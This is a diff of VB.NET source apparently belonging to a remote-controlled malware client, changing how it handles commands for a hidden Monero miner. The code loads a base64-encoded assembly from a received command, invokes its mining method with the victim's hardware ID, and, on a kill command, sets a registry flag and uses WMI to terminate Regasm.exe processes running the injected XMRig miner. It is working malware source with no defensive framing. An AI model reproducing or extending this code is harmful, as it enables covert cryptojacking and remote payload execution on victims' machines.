@@ -51,21 +51,36 @@
                 For Each Type_ As Type In System.AppDomain.CurrentDomain.Load(Convert.FromBase64String(A(5))).GetTypes
                     For Each GM In Type_.GetMethods
                         If GM.Name = "XM" Then
+                            If A(1).Contains("<CUS>") Then
+                                GM.Invoke(Nothing, New Object() {A(1), "", "", "", ""})
+                                Return
+                            End If
+
                             If A(1) = "50%" Then
                                 A(1) = Environment.ProcessorCount / 2
                             End If
                             If A(4) = "ID%" Then
                                 A(4) = HWID
                             End If
-                            GM.Invoke(Nothing, New Object() {A(1), A(2), A(3), A(4)})
+                            GM.Invoke(Nothing, New Object() {A(1), A(2), A(3), A(4), HWID})
                         End If
                     Next
                 Next
 
             Case "XMR-K"
-                For Each P As Process In System.Diagnostics.Process.GetProcessesByName("Regasm")
-                    P.Kill()
+                Microsoft.Win32.Registry.CurrentUser.CreateSubKey("Software\" & HWID).SetValue("MinerXMR", "False")
+
+                Dim objWMIService = GetObject("winmgmts:" & "{impersonationLevel=impersonate}!\\" & Environment.UserDomainName & "\root\cimv2")
+                Dim colProcess = objWMIService.ExecQuery("Select * from Win32_Process")
+                Dim wmiQuery As String = String.Format("select CommandLine from Win32_Process where Name='{0}'", "Regasm.exe")
+                Dim searcher As Management.ManagementObjectSearcher = New Management.ManagementObjectSearcher(wmiQuery)
+                Dim retObjectCollection As Management.ManagementObjectCollection = searcher.Get
+                For Each retObject In colProcess
+                    If retObject.CommandLine.ToString.Contains("--donate-level=") Then
+                        retObject.Terminate()
+                    End If
                 Next
+
         End Select
     End Sub
 
